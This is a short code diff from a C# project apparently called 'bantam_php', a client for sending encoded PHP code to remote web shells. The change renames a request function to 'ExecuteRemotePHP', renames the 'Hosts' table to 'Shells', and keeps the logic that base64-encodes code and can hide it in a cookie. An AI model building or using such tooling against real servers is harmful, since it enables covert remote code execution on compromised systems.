@@ -145,10 +145,10 @@ namespace bantam_php
         /// <param name="url"></param>
         /// <param name="code"></param>
         /// <returns></returns>
-        public static async Task<string> WebRequest(string url, string code)
+        public static async Task<string> ExecuteRemotePHP(string url, string code)
         {
-            string requestArgsName = BantamMain.Hosts[url].RequestArgName;
-            bool sendViaCookie = BantamMain.Hosts[url].SendDataViaCookie;
+            string requestArgsName = BantamMain.Shells[url].requestArgName;
+            bool sendViaCookie = BantamMain.Shells[url].sendDataViaCookie;
 
             try {
                 HttpMethod method;
@@ -161,7 +161,7 @@ namespace bantam_php
                 var request = new HttpRequestMessage(method, url);
 
                 if (!string.IsNullOrEmpty(code)) {
-                    string minifiedCode = PhpHelper.minifyCode(code);
+                    string minifiedCode = PhpHelper.MinifyCode(code);
                     string encodedCode = HttpUtility.UrlEncode(minifiedCode);
                     var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(encodedCode);
                     string b64 = System.Convert.ToBase64String(plainTextBytes);
